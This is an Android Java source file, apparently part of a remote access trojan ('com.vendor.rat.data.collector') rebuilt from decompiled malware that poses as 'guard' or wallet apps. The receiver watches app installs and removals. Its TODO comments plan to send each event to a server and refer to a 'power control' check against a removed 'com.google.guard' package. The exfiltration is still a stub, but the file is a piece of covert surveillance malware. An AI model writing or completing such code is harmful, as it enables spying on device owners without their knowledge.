package com.vendor.rat.data.collector;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * ADAPT: vendor com.guard.wallet.receiver.PackageReceiver
 * Monitors PACKAGE_ADDED and PACKAGE_REMOVED events.
 */
public class PackageReceiver extends BroadcastReceiver {

    private static final String TAG = "PackageReceiver";

    // ADAPT: vendor field f197a (Integer, init 0) — receiver alive flag
    public Integer receiverAlive = 0;

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            this.receiverAlive = 1;
            if (intent == null) return;
            String action = intent.getAction();
            if (action == null || action.isEmpty()) return;

            Log.d(TAG, action);
            String dataString = intent.getDataString();
            String packageName = null;
            if (dataString != null && !dataString.isEmpty()) {
                packageName = dataString.replaceAll("package:", "");
            }

            if ("android.intent.action.PACKAGE_ADDED".equals(action)) {
                Log.d(TAG, "安装了:" + packageName + "包名的程序");
                // ADAPT: vendor calls g.d0(packageName) to get AppInfo
                // TODO: VENDOR_VERIFY — build AppInfo from installed package
            } else if ("android.intent.action.PACKAGE_REMOVED".equals(action)) {
                Log.d(TAG, "卸载了:" + packageName + "包名的程序");
                // ADAPT: vendor builds AppInfo with uninstalled=1
                // vendor checks if removed pkg == "com.google.guard" for power control
            }

            // ADAPT: vendor sends MessageRecordVO with AppInfo body
            // via MainApplication.getHandlerMsgAndTimer().b()
            // TODO: VENDOR_VERIFY — send package event to server
        } catch (Exception e) {
            Log.e(TAG, "Error in onReceive", e);
        }
    }
}